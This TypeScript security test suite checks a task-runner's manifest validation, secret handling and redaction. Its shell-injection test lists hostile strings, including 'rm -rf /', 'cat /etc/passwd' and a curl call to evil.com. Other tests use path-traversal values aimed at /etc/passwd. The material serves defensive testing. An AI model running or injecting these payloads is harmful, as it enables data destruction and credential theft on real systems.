import assert from "node:assert/strict";
import process from "node:process";

import {
  loadTaskManifest,
  computeManifestSha256,
  validateAndSubstitute,
  isTaskApproved,
  checkManifestIntegrity,
} from "./task-manifest.js";
import { TaskRunner } from "./task-runner.js";
import { TaskError } from "./task-errors.js";
import {
  InMemorySecretResolver,
  redactSecrets,
} from "./secret-resolver.js";
import {
  createFixtureDir,
  writeManifest,
  safeCleanup,
  isWin,
  TEST_SECRET,
  SECRET_TASK_MANIFEST,
  PATH_PARAM_MANIFEST,
} from "./security-review-helpers.js";

export function test_av12_shell_metacharacter_injection(): void {
  const dir = createFixtureDir("av12");
  try {
    const manifestYaml = `version: 1
tasks:
  template-echo:
    mode: run
    command: ["node", "-e", "process.stdout.write(process.argv[2])"]
    runtime: system
    timeout_seconds: 10
    parameters:
      input:
        type: string
        required: true
`;
    writeManifest(dir, manifestYaml);

    const manifest = loadTaskManifest(dir);
    const task = manifest.tasks["template-echo"];

    const shellPayloads = [
      "safe && rm -rf /",
      "x | cat /etc/passwd",
      "$(whoami)",
      "`id`",
      "; echo hacked",
      "x\ncurl evil.com",
    ];

    for (const payload of shellPayloads) {
      const { command, errors } = validateAndSubstitute(
        task,
        { input: payload },
        dir,
        [],
      );

      assert.equal(
        errors.length,
        0,
        `param '${payload}' should be accepted as string`,
      );

      const cmdStr = command.join(" ");
      assert.ok(
        !cmdStr.includes(payload),
        `shell payload should NOT be in command: ${cmdStr}`,
      );
    }

    console.log(
      "PASS: AV12 - Shell metacharacters NOT injected into command argv",
    );
  } finally {
    safeCleanup(dir);
  }
}

export function test_av13_runtime_override_bypass(): void {
  const dir = createFixtureDir("av13");
  try {
    const manifestYaml = `version: 1
tasks:
  bad-runtime:
    mode: run
    command: ["echo", "hi"]
    runtime: shell_escape
`;
    writeManifest(dir, manifestYaml);

    try {
      loadTaskManifest(dir);
      assert.fail("should have rejected unsupported runtime");
    } catch (e) {
      assert.ok(e instanceof TaskError);
      assert.equal((e as TaskError).code, "TASK_EXECUTOR_UNSUPPORTED");
    }

    console.log("PASS: AV13 - Unsupported runtime rejected at manifest load");
  } finally {
    safeCleanup(dir);
  }
}

export async function test_av14_secret_not_in_global_env(): Promise<void> {
  const dir = createFixtureDir("av14");
  try {
    writeManifest(
      dir,
      `version: 1
tasks:
  env-test:
    mode: run
    command: ["node", "-e", "console.log(process.env.GLOBAL_LEAK || 'clean')"]
    runtime: system
    timeout_seconds: 10
    secrets:
      - secret_ref: leak_secret
        target_env: GLOBAL_LEAK
`,
    );

    const runner = new TaskRunner();
    const resolver = new InMemorySecretResolver();
    resolver.set("leak_secret", "SHOULD_NOT_LEAK_GLOBALLY");
    runner.setSecretResolver(resolver);

    const beforeGlobalEnv = process.env["GLOBAL_LEAK"];

    const result = await runner.runTask({
      workspaceId: "ws_test",
      workspaceRoot: dir,
      taskId: "env-test",
      params: {},
      additionalRoots: [],
    });

    const afterGlobalEnv = process.env["GLOBAL_LEAK"];
    assert.equal(
      afterGlobalEnv,
      beforeGlobalEnv,
      "secret should NOT leak to global process.env",
    );

    if (result.mode === "run") {
      assert.ok(result.stdout.includes("[REDACTED_SECRET]"));
      assert.ok(!result.stdout.includes("SHOULD_NOT_LEAK_GLOBALLY"));
    }

    console.log("PASS: AV14 - Secrets NOT injected into global process.env");
  } finally {
    safeCleanup(dir);
  }
}

export function test_av15_secret_type_coercion(): void {
  const dir = createFixtureDir("av15");
  try {
    const badManifest = `version: 1
tasks:
  type-coerce:
    mode: run
    command: ["echo", "hi"]
    runtime: system
    secrets:
      - secret_ref: 12345
        target_env: MY_ENV
`;
    writeManifest(dir, badManifest);

    try {
      loadTaskManifest(dir);
      assert.fail("should reject non-string secret_ref");
    } catch (e) {
      assert.ok(e instanceof TaskError);
      const te = e as TaskError;
      assert.ok(
        te.message.includes("secret_ref") ||
          te.code === "TASK_MANIFEST_SCHEMA_ERROR",
      );
    }

    const emptyRefManifest = `version: 1
tasks:
  empty-ref:
    mode: run
    command: ["echo", "hi"]
    runtime: system
    secrets:
      - secret_ref: ""
        target_env: MY_ENV
`;
    writeManifest(dir, emptyRefManifest);

    try {
      loadTaskManifest(dir);
      assert.fail("should reject empty secret_ref");
    } catch (e) {
      assert.ok(e instanceof TaskError);
    }

    console.log(
      "PASS: AV15 - Secret type coercion blocked by schema validation",
    );
  } finally {
    safeCleanup(dir);
  }
}

export function test_av16_redaction_bypass_unicode(): void {
  const zombieSecret = "sk_live_evilhacker\u200Btoken";
  const result1 = redactSecrets(`Token: sk_live_evilhacker\u200Btoken`, [
    zombieSecret,
  ]);
  assert.ok(
    result1.includes("[REDACTED_SECRET]"),
    "secret with zero-width char should be redacted",
  );

  const partialResult = redactSecrets("sk_live_evilhacker", [zombieSecret]);
  assert.equal(partialResult, "sk_live_evilhacker");

  const regexSecret = "a+b*c?d^e.f$g|h{i}j[k]l(m)n";
  const result2 = redactSecrets(`Value: ${regexSecret}`, [regexSecret]);
  assert.ok(result2.includes("[REDACTED_SECRET]"));

  const multilineSecret = "line1\nline2";
  const result3 = redactSecrets(`before\nline1\nline2\nafter`, [
    multilineSecret,
  ]);
  assert.ok(result3.includes("[REDACTED_SECRET]"));

  console.log(
    "PASS: AV16 - Redaction handles Unicode/encoding tricks correctly",
  );
}

export function test_av17_approval_bypass_no_manifest(): void {
  const dir = createFixtureDir("av17");
  try {
    const sha = computeManifestSha256(dir);
    assert.equal(sha, null, "SHA should be null for non-existent manifest");

    const approved = { manifestSha256: "some_fake_sha", taskIds: ["test"] };
    assert.ok(
      !checkManifestIntegrity(dir, approved),
      "null vs non-null should not match",
    );

    const approvedNull = { manifestSha256: "null_sha_not_valid", taskIds: [] };
    assert.ok(!checkManifestIntegrity(dir, approvedNull));

    console.log("PASS: AV17 - Non-existent manifest cannot satisfy approval");
  } finally {
    safeCleanup(dir);
  }
}

export async function test_av18_task_id_approval_spoofing(): Promise<void> {
  const dir = createFixtureDir("av18");
  try {
    writeManifest(dir, SECRET_TASK_MANIFEST);
    const sha = computeManifestSha256(dir)!;

    const approved = {
      manifestSha256: sha,
      taskIds: ["non_existent_task"],
    };

    assert.ok(isTaskApproved("non_existent_task", approved));

    const runner = new TaskRunner();
    try {
      await runner.runTask({
        workspaceId: "ws_test",
        workspaceRoot: dir,
        taskId: "non_existent_task",
        params: {},
        additionalRoots: [],
      });
      assert.fail("should throw for non-existent task");
    } catch (e) {
      assert.ok(e instanceof TaskError);
      assert.equal((e as TaskError).code, "TASK_ID_UNKNOWN");
    }

    console.log(
      "PASS: AV18 - Task ID spoofing in approval blocked by manifest validation",
    );
  } finally {
    safeCleanup(dir);
  }
}

export async function test_av19_secret_ref_path_traversal(): Promise<void> {
  const dir = createFixtureDir("av19");
  try {
    const traverseManifest = `version: 1
tasks:
  traverse:
    mode: run
    command: ["echo", "hi"]
    runtime: system
    timeout_seconds: 10
    secrets:
      - secret_ref: "../../../etc/passwd"
        target_env: MALICIOUS_ENV
`;
    writeManifest(dir, traverseManifest);

    const manifest = loadTaskManifest(dir);
    const task = manifest.tasks["traverse"];
    assert.equal(task.secrets![0].secret_ref, "../../../etc/passwd");

    const resolver = new InMemorySecretResolver();
    resolver.set("../../../etc/passwd", "not_actually_a_file");

    const runner = new TaskRunner();
    runner.setSecretResolver(resolver);

    try {
      await runner.runTask({
        workspaceId: "ws_test",
        workspaceRoot: dir,
        taskId: "traverse",
        params: {},
        additionalRoots: [],
      });
      console.log(
        "  Path traversal in secret_ref is treated as literal key (safe)",
      );
    } catch (e) {
      console.log(`  Execution blocked: ${e}`);
    }

    console.log(
      "PASS: AV19 - Secret ref path traversal treated as literal key",
    );
  } finally {
    safeCleanup(dir);
  }
}

export function test_av20_path_param_outside_roots(): void {
  const dir = createFixtureDir("av20");
  try {
    writeManifest(dir, PATH_PARAM_MANIFEST);
    const manifest = loadTaskManifest(dir);
    const task = manifest.tasks["path-echo"];

    const outsidePath = isWin
      ? "C:\\Windows\\System32\\drivers\\etc\\hosts"
      : "/etc/passwd";

    const { errors } = validateAndSubstitute(task, { file: outsidePath }, dir, [
      dir,
    ]);

    assert.ok(errors.length > 0, "path outside roots should be rejected");
    assert.ok(
      errors[0].message.includes("outside allowed roots"),
      `error should mention roots: ${errors[0].message}`,
    );

    console.log("PASS: AV20 - Path param outside allowed roots rejected");
  } finally {
    safeCleanup(dir);
  }
}

export async function test_av21_target_env_validation(): Promise<void> {
  const dir = createFixtureDir("av21");
  try {
    const validManifest = `version: 1
tasks:
  valid:
    mode: run
    command: ["echo", "hi"]
    runtime: system
    timeout_seconds: 10
    secrets:
      - secret_ref: my_secret
        target_env: VALID_ENV_NAME_123
`;
    writeManifest(dir, validManifest);

    const manifest = loadTaskManifest(dir);
    assert.ok(manifest.tasks["valid"]);

    const runner = new TaskRunner();
    const resolver = new InMemorySecretResolver();
    resolver.set("my_secret", "value");
    runner.setSecretResolver(resolver);

    try {
      const result = await runner.runTask({
        workspaceId: "ws_test",
        workspaceRoot: dir,
        taskId: "valid",
        params: {},
        additionalRoots: [],
      });
      console.log(
        `  Valid env name accepted: ${result.mode === "run" ? result.status : "session"}`,
      );
    } catch (e) {
      console.log(`  Env name validation: ${e}`);
    }

    const invalidManifest = `version: 1
tasks:
  invalid-env:
    mode: run
    command: ["echo", "hi"]
    runtime: system
    timeout_seconds: 10
    secrets:
      - secret_ref: my_secret
        target_env: "INVALID-ENV!@#"
`;
    writeManifest(dir, invalidManifest);
    const runner2 = new TaskRunner();
    runner2.setSecretResolver(resolver);

    try {
      await runner2.runTask({
        workspaceId: "ws_test",
        workspaceRoot: dir,
        taskId: "invalid-env",
        params: {},
        additionalRoots: [],
      });
      assert.fail("should reject invalid target_env name");
    } catch (e) {
      const msg = String(e);
      assert.ok(
        msg.includes("Invalid target_env") ||
          msg.includes("TASK_MANIFEST_SCHEMA_ERROR"),
        `should reject invalid env name: ${msg}`,
      );
    }

    console.log("PASS: AV21 - target_env name validation at resolve time");
  } finally {
    safeCleanup(dir);
  }
}

export async function test_av22_concurrent_session_secret_leak(): Promise<void> {
  const dir = createFixtureDir("av22");
  try {
    writeManifest(dir, SECRET_TASK_MANIFEST);

    const runner = new TaskRunner();
    const resolver = new InMemorySecretResolver();
    resolver.set("github_token", TEST_SECRET);
    runner.setSecretResolver(resolver);

    const sessionManifest = `version: 1
tasks:
  session-secret:
    mode: session
    command: ["node", "-e", "setTimeout(() => process.exit(0), 5000)"]
    runtime: system
    timeout_seconds: 30
    secrets:
      - secret_ref: github_token
        target_env: MY_TOKEN
`;
    writeManifest(dir, sessionManifest);

    const sessionResult2 = await runner.runTask({
      workspaceId: "ws_test",
      workspaceRoot: dir,
      taskId: "session-secret",
      params: {},
      additionalRoots: [],
    });

    if (sessionResult2.mode === "session") {
      const session = runner.getSession(sessionResult2.sessionId);
      if (session) {
        assert.ok(
          !session.stdout.includes(TEST_SECRET),
          "session stdout should not leak secret",
        );
        assert.ok(
          !session.stderr.includes(TEST_SECRET),
          "session stderr should not leak secret",
        );
      }
    }

    console.log("PASS: AV22 - Session mode secrets redacted on getSession");
  } finally {
    safeCleanup(dir);
  }
}

export const part2Tests: Array<{ name: string; fn: () => Promise<void> | void }> = [
  { name: "AV12: Shell metacharacter injection blocked", fn: test_av12_shell_metacharacter_injection },
  { name: "AV13: Runtime override bypass blocked", fn: test_av13_runtime_override_bypass },
  { name: "AV14: No secret in global process.env", fn: test_av14_secret_not_in_global_env },
  { name: "AV15: Secret type coercion blocked", fn: test_av15_secret_type_coercion },
  { name: "AV16: Redaction bypass (unicode) blocked", fn: test_av16_redaction_bypass_unicode },
  { name: "AV17: Approval bypass no manifest blocked", fn: test_av17_approval_bypass_no_manifest },
  { name: "AV18: Task ID spoofing blocked", fn: test_av18_task_id_approval_spoofing },
  { name: "AV19: Secret ref path traversal harmless", fn: test_av19_secret_ref_path_traversal },
  { name: "AV20: Path param outside roots blocked", fn: test_av20_path_param_outside_roots },
  { name: "AV21: target_env validation", fn: test_av21_target_env_validation },
  { name: "AV22: Concurrent session secret leak blocked", fn: test_av22_concurrent_session_secret_leak },
];
